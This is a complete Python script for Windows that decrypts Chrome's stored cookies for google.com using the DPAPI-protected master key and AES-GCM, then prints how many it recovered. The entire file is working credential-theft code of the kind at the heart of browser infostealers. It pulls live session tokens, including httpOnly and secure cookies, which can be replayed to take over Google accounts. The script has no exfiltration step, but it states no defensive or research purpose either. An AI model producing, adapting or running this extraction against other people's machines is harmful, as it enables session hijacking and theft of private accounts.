import os
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_chrome_encryption_key():
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    # Remove 'DPAPI' prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_cookie_value(encrypted_val, key):
    try:
        # Chrome v80+: 'v10' or 'v11' prefix (first 3 bytes), then 12 bytes nonce, then ciphertext + tag
        nonce = encrypted_val[3:15]
        ciphertext = encrypted_val[15:]
        aesgcm = AESGCM(key)
        decrypted = aesgcm.decrypt(nonce, ciphertext, None)
        return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(encrypted_val, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""

def get_google_cookies():
    cookie_db = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies')
    if not os.path.exists(cookie_db):
        return []
    
    key = get_chrome_encryption_key()
    if not key:
        return []

    # Copy database to temp file because Chrome has a lock on it
    temp_dir = tempfile.mkdtemp()
    temp_db = os.path.join(temp_dir, 'Cookies.db')
    shutil.copy2(cookie_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, path, encrypted_value, is_secure, is_httponly FROM cookies WHERE host_key LIKE '%google.com%'")
    
    cookies = []
    for host, name, path, enc_val, secure, httponly in cursor.fetchall():
        val = decrypt_cookie_value(enc_val, key)
        if val:
            cookies.append({
                'name': name,
                'value': val,
                'domain': host,
                'path': path,
                'secure': bool(secure),
                'httpOnly': bool(httponly)
            })
            
    conn.close()
    try:
        os.remove(temp_db)
        os.rmdir(temp_dir)
    except Exception:
        pass
        
    return cookies

if __name__ == "__main__":
    cookies = get_google_cookies()
    print(f"Extracted {len(cookies)} Google cookies from Chrome!")
    for c in cookies[:5]:
        print(f"  {c['name']} @ {c['domain']}")
